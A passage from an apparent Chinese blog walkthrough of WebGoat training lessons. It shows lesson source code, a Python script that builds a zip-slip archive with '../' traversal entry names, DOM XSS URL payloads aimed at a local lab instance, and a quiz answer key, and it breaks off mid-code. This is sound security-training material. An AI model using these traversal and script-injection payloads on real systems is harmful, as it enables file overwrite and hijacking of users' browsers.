class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProfileZipSlip</span><span class="params">(<span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span> String webGoatHomeDirectory, WebSession webSession)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(webGoatHomeDirectory, webSession);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/PathTraversal/zip-slip&quot;, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">uploadFileHandler</span><span class="params">(<span class="meta">@RequestParam(&quot;uploadedFileZipSlip&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!file.getOriginalFilename().toLowerCase().endsWith(<span class="string">&quot;.zip&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//            如果文件名不是以.zip结尾</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;path-traversal-zip-slip.no-zip&quot;</span>).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> processZipUpload(file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">processZipUpload</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">tmpZipDirectory</span> <span class="operator">=</span> Files.createTempDirectory(getWebSession().getUserName());</span><br><span class="line"><span class="comment">//        获取文件名并创建一个临时目录</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">uploadDirectory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getWebGoatHomeDirectory(), <span class="string">&quot;/PathTraversal/&quot;</span> + getWebSession().getUserName());</span><br><span class="line"><span class="comment">//        对目录进行拼接</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">currentImage</span> <span class="operator">=</span> getProfilePictureAsBase64();</span><br><span class="line"><span class="comment">//        获取下当前图片</span></span><br><span class="line">        Files.createDirectories(uploadDirectory.toPath());</span><br><span class="line"><span class="comment">//        创建目录</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">uploadedZipFile</span> <span class="operator">=</span> tmpZipDirectory.resolve(file.getOriginalFilename());</span><br><span class="line"><span class="comment">//            将临时路径添加进去</span></span><br><span class="line">            FileCopyUtils.copy(file.getBytes(), uploadedZipFile.toFile());</span><br><span class="line"><span class="comment">//            将上传文件 存放进去</span></span><br><span class="line">            <span class="type">ZipFile</span> <span class="variable">zip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(uploadedZipFile.toFile());</span><br><span class="line"><span class="comment">//            打开一个zip文件进行读取</span></span><br><span class="line">            Enumeration&lt;? <span class="keyword">extends</span> <span class="title class_">ZipEntry</span>&gt; entries = zip.entries();</span><br><span class="line"><span class="comment">//            返回zip文件条目的枚举</span></span><br><span class="line">            <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">ZipEntry</span> <span class="variable">e</span> <span class="operator">=</span> entries.nextElement();</span><br><span class="line"><span class="comment">//                选择下一个</span></span><br><span class="line">                <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadedZipFile.toFile(), e.getName());</span><br><span class="line"><span class="comment">//                新建一个文件实例</span></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> zip.getInputStream(e);</span><br><span class="line"><span class="comment">//                将文件读入流</span></span><br><span class="line">                Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING);</span><br><span class="line"><span class="comment">//                将文件复制进去 如果文件存在就清除</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> isSolved(currentImage, getProfilePictureAsBase64());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">isSolved</span><span class="params">(<span class="type">byte</span>[] currentImage, <span class="type">byte</span>[] newImage)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.equals(currentImage, newImage)) &#123;</span><br><span class="line"><span class="comment">//            如果两个图片相等</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;path-traversal-zip-slip.extracted&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success(<span class="built_in">this</span>).output(<span class="string">&quot;path-traversal-zip-slip.extracted&quot;</span>).build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/PathTraversal/zip-slip&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; getProfilePicture()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getProfilePicture();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/PathTraversal/zip-slip/profile-image/&#123;username&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; getProfilePicture(<span class="meta">@PathVariable(&quot;username&quot;)</span>String username)&#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.notFound().build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里考察的其实是zip slip目录遍历漏洞</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910132227695.png" alt="image-20220910132227695"></p>
<p>我们先看怎么做</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;zf.zip&#x27;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">fname = <span class="string">&quot;zf.jpg&quot;</span></span><br><span class="line">zf.write(fname,<span class="string">&quot;../../../../../../../../../../../../Users/14980/.webgoat-8.2.3-SNAPSHOT/PathTraversal/123456/zf.jpg&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里是使用python生成一个zf.zip 其中的内容呢是 zf.jpg中的内容 而压缩后的文件名为后面的一长串 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910132923157.png" alt="image-20220910132923157"></p>
<p>上传zip</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133013887.png" alt="image-20220910133013887"></p>
<p>这里可以看到经过目录穿越到达了这个目录下面</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133100966.png" alt="image-20220910133100966"></p>
<p>这里的判断结果也是两个数组是否相同 也就是图片有没有上传上去</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133201950.png" alt="image-20220910133201950"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133227276.png" alt="image-20220910133227276"></p>
<h2 id="xss-1"><a href="#xss-1" class="headerlink" title="xss"></a>xss</h2><h3 id="CrossSiteScripting"><a href="#CrossSiteScripting" class="headerlink" title="CrossSiteScripting"></a>CrossSiteScripting</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScripting</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xss.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CrossSiteScriptingLesson1"><a href="#CrossSiteScriptingLesson1" class="headerlink" title="CrossSiteScriptingLesson1"></a>CrossSiteScriptingLesson1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingLesson1</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/attack1&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam(value = &quot;checkboxAttack1&quot;,required = false)</span>String checkboxValue)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (checkboxValue != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss.lesson1.failure&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这关让我们了解什么xss</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910134114167.png" alt="image-20220910134114167"></p>
<p>选中对号即可过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910134128457.png" alt="image-20220910134128457"></p>
<h3 id="CrossSiteScriptingLesson5a"><a href="#CrossSiteScriptingLesson5a" class="headerlink" title="CrossSiteScriptingLesson5a"></a>CrossSiteScriptingLesson5a</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Predicate;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;xss-reflected-5a-hint-1&quot;, &quot;xss-reflected-5a-hint-2&quot;, &quot;xss-reflected-5a-hint-3&quot;, &quot;xss-reflected-5a-hint-4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingLesson5a</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Predicate&lt;String &gt; XSS_PATTERN = Pattern.compile(<span class="string">&quot;.*&lt;script&gt;(console\\.log|alert)\\(.*\\);?&lt;/script&gt;.*&quot;</span>,Pattern.CASE_INSENSITIVE).asMatchPredicate();</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/CrossSiteScripting/attack5a&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> Integer QTY1,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> Integer QTY2, <span class="meta">@RequestParam</span> Integer QTY3,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> Integer QTY4, <span class="meta">@RequestParam</span> String field1,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String field2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (XSS_PATTERN.test(field2))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-reflected-5a-failed-wrong-field&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> <span class="variable">totalSale</span> <span class="operator">=</span> QTY1.intValue() * <span class="number">69.99</span> + QTY2.intValue() + <span class="number">27.99</span> + QTY3.intValue() * <span class="number">1599.99</span> + QTY4.intValue() * <span class="number">299.99</span>;</span><br><span class="line"></span><br><span class="line">        userSessionData.setValue(<span class="string">&quot;xss-reflected1-complete&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        cart.append(<span class="string">&quot;Thank you for shopping at WebGoat. &lt;br /&gt;Your support is appreciated&lt;hr /&gt;&quot;</span>);</span><br><span class="line">        cart.append(<span class="string">&quot;&lt;p&gt;We have charged credit card:&quot;</span> + field1 + <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">        cart.append(<span class="string">&quot;                             ------------------- &lt;br /&gt;&quot;</span>);</span><br><span class="line">        cart.append(<span class="string">&quot;                               $&quot;</span> + totalSale);</span><br><span class="line">        <span class="keyword">if</span> (userSessionData.getValue(<span class="string">&quot;xss-reflected1-complete&quot;</span>) == <span class="literal">null</span>)&#123;</span><br><span class="line">            userSessionData.setValue(<span class="string">&quot;xss-reflected1-complete&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (XSS_PATTERN.test(field1))&#123;</span><br><span class="line">            userSessionData.setValue(<span class="string">&quot;xss-reflected-5a-complete&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (field1.toLowerCase().contains(<span class="string">&quot;console.log&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-reflected-5a-success-console&quot;</span>).output(cart.toString()).build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-reflected-5a-success-alert&quot;</span>).output(cart.toString()).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            userSessionData.setValue(<span class="string">&quot;xss-reflected1-complete&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-reflected-5a-failure&quot;</span>)</span><br><span class="line">                    .output(cart.toString())</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910153412297.png" alt="image-20220910153412297"></p>
<h3 id="CrossSiteScriptingLesson6a"><a href="#CrossSiteScriptingLesson6a" class="headerlink" title="CrossSiteScriptingLesson6a"></a>CrossSiteScriptingLesson6a</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;xss-reflected-6a-hint-1&quot;, &quot;xss-reflected-6a-hint-2&quot;, &quot;xss-reflected-6a-hint-3&quot;, &quot;xss-reflected-6a-hint-4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingLesson6a</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/attack6a&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String DOMTestRoute)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (DOMTestRoute.matches(<span class="string">&quot;start\\.mvc#test(\\/|)&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-reflected-6a-success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-reflected-6a-failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910154405873.png" alt="image-20220910154405873"></p>
<h3 id="DOMCrossSiteScriptingVerifier"><a href="#DOMCrossSiteScriptingVerifier" class="headerlink" title="DOMCrossSiteScriptingVerifier"></a>DOMCrossSiteScriptingVerifier</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;xss-dom-message-hint-1&quot;, &quot;xss-dom-message-hint-2&quot;, &quot;xss-dom-message-hint-3&quot;, &quot;xss-dom-message-hint-4&quot;, &quot;xss-dom-message-hint-5&quot;, &quot;xss-dom-message-hint-6&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DOMCrossSiteScriptingVerifier</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/dom-follow-up&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String  successMessage)</span>&#123;</span><br><span class="line">        <span class="type">UserSessionData</span> <span class="variable">userSessionData</span> <span class="operator">=</span> getUserSessionData();</span><br><span class="line">        <span class="type">String</span> <span class="variable">answer</span> <span class="operator">=</span> (String) userSessionData.getValue(<span class="string">&quot;randValue&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (successMessage.equals(answer))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-dom-message-success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-dom-message-failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DOMCrossSiteScripting-1"><a href="#DOMCrossSiteScripting-1" class="headerlink" title="DOMCrossSiteScripting"></a>DOMCrossSiteScripting</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DOMCrossSiteScripting</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/phone-home-xss&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> Integer param1,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> Integer param2, HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">UserSessionData</span> <span class="variable">userSessionData</span> <span class="operator">=</span> getUserSessionData();</span><br><span class="line">        <span class="type">SecureRandom</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>();</span><br><span class="line">        userSessionData.setValue(<span class="string">&quot;randValue&quot;</span>,String.valueOf(number.nextInt()));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (param1 == <span class="number">42</span> &amp;&amp; param2 == <span class="number">24</span> &amp;&amp; request.getHeader(<span class="string">&quot;webgoat-requested-by&quot;</span>).equals(<span class="string">&quot;dom-xss-vuln&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).output(<span class="string">&quot;phoneHome Response is &quot;</span>+ userSessionData.getValue(<span class="string">&quot;randValue&quot;</span>.toString())).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是根据上一关给的 start.mvc#test&#x2F; 去构造 dom xss</p>
<p>可以发现存在回显 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/WebGoat/start.mvc#test/webgoat.customjs.phoneHome()</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910162859176.png" alt="image-20220910162859176"></p>
<p>但是并没有执行 原因就是没有当做js代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:8081/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910175533353.png" alt="image-20220910175533353"></p>
<p>提交即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910175612140.png" alt="image-20220910175612140"></p>
<p>这里奇怪的是 如果补全了就不执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910163030582.png" alt="image-20220910163030582"></p>
<h3 id="CrossSiteScriptingQuiz"><a href="#CrossSiteScriptingQuiz" class="headerlink" title="CrossSiteScriptingQuiz"></a>CrossSiteScriptingQuiz</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingQuiz</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    String[] solutions  = &#123;<span class="string">&quot;Solution 4&quot;</span>,<span class="string">&quot;Solution 3&quot;</span>,<span class="string">&quot;Solution 1&quot;</span>,<span class="string">&quot;Solution 2&quot;</span>,<span class="string">&quot;Solution 4&quot;</span>&#125;;</span><br><span class="line">    <span class="type">boolean</span>[] guesses = <span class="keyword">new</span> <span class="title class_">boolean</span>[solutions.length];</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String[] question_0_solution, <span class="meta">@RequestParam</span> String[] question_1_solution, <span class="meta">@RequestParam</span> String[] question_2_solution, <span class="meta">@RequestParam</span> String[] question_3_solution, <span class="meta">@RequestParam</span> String[] question_4_solution)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">correctAnswers</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        String[] givenAnswers = &#123;question_0_solution[<span class="number">0</span>], question_1_solution[<span class="number">0</span>], question_2_solution[<span class="number">0</span>], question_3_solution[<span class="number">0</span>], question_4_solution[<span class="number">0</span>]&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; solutions.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (givenAnswers[i].contains(solutions[i]))&#123;</span><br><span class="line">                <span class="keyword">if</span> (givenAnswers[i].contains(solutions[i]))&#123;</span><br><span class="line">                    correctAnswers ++ ;</span><br><span class="line">                    guesses[i] = 